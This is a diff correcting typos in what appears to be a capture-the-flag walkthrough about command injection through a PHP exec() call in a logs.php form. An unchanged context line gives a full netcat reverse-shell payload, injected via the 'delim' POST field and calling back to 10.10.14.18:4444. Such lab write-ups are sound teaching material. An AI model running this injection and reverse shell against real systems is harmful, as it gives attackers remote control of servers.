@@ -273,11 +273,11 @@ Here we can see the following line executed by `PHP` : `$output = exec("/usr/bin
 Our delimiter is being concatenated directly in the `exec()` function and passed as an argument to the `Python` script above.
 
 The trick here is that we can fool the `exec()` function by adding `;` to the end of the argument and add more bash commands in order for `exec()`<br>
-to execute them. I that point, I was mostly thinking about adding a reverse shell right in the `$_POST['delim']` variable like so : 
+to execute them. At that point, I was mostly thinking about adding a reverse shell right in the `$_POST['delim']` variable like so : 
 
 `$_POST['delim']` =  `space;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f` <br>
 
-### Getting a Reversee Shell - POST /logs .php
+### Getting a Reverse Shell - POST /logs .php
 ---
 
 So now let's try this within Burp by capturing the `POST` request to `/logs.php` by clicking the `Submit` button.<br>
